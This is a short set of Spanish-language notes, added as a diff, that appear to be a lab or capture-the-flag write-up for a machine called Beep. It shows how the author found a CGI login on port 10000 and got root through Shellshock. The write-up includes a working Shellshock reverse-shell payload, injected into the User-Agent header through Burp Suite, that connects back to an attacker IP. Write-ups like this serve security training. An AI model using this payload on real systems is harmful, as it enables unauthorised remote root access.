@@ -1,0 +1,44 @@
+maquina beep ----- ----------- linux 
+
+aprendizaje 
+
+Apache
+PHP
+Penetration Tester Level 2
+Python
+Web
+Protocols
+Telecom
+Fuzzing
+Local File Inclusion
+Remote Code Execution
+
+----------------------
+
+podemos ver que la maquina tiene varios puertos abiertos tanto de paginas como de ssh como de todo
+
+el tema es que nos interesa la que pone miniserver el puerto 10000 
+
+porque cuando intentamos logearnos no sale un login.cgi 
+
+y eso nos recuerda a shellshock 
+
+pero esta vez vamos a explotarlo atraves de burpsuit y el user agent 
+
+solo tenemos que entrar a esa pagina e intentar logearnos con lo que sea pero capturando la peticion con burpsuit 
+hemos metido este comando en el lugar de user aggent
+
+(){ :; }; bash -i >& /dev/tcp/10.10.14.57/443 0>&1
+
+
+nos hemos puesto en escucha y listo, hemos entrado como root
+
+la idea la hemos sacado de esta pagina 
+
+https://empresas.blogthinkbig.com/shellshock-como-se-podria-explotar-en/
+
+el tema es que es una de las maneras de explotar shell shock 
+
+todos los archivos cgi se pueden explotar de esta manera 
+
+
